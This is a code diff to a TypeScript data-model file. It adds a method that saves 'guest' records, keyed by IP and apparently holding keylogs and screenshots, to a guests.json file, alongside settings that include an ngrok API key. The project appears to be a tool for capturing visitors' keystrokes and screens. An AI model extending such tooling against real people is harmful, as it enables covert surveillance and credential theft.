@@ -3,6 +3,7 @@ import * as Path from 'path'
 import { Model, Timestamps } from 'nedb-models'
 
 import { BASE_DIR } from './constants'
+import { note } from '../bin/styles'
 
 
 export const storagePath = Path.join(BASE_DIR, 'collections')
@@ -66,7 +67,38 @@ export class Guest extends Model {
         this.screenshots = screenshots
         this.keyLogs = keyLogs
 
-        return await this.save()
+        return await this.store()
+    }
+
+    async store():Promise<Guest> {
+        const data:Guest = await super.save()
+        const jsonPath = Path.join(BASE_DIR, 'guests.json')
+        let guests:Guest[] = []
+        
+        try {
+            if (FS.existsSync(jsonPath)) guests = JSON.parse(await FS.promises.readFile(jsonPath, 'utf-8'))
+        } catch(err) {
+            console.warn(note('Error: ') + 'filed to read or parse guests.json file.\n')
+            console.log(err, '\n')
+        }
+
+        const guest = Object.assign({}, (guests.find(g => g.ip === data.ip) || {}), data)
+
+        try {
+            await FS.promises.writeFile(
+                jsonPath,
+                JSON.stringify(
+                    guests
+                        .filter(g => g.ip !== guest.ip)
+                        .concat([guest])
+                , null, 4)
+            )
+        } catch(err) {
+            console.warn(note('Error: ') + 'filed to write to or create guests.json file.\n')
+            console.log(err, '\n')
+        }
+
+        return data
     }
 
     static datastore() {
@@ -87,7 +119,11 @@ export class Setting extends Model {
         this.retries = retries
         this.ngrokApiKey = ngrokApiKey
 
-        return await this.save()
+        return await this.store()
+    }
+
+    async store():Promise<Setting> {
+        return await super.save()
     }
 
     static datastore() {
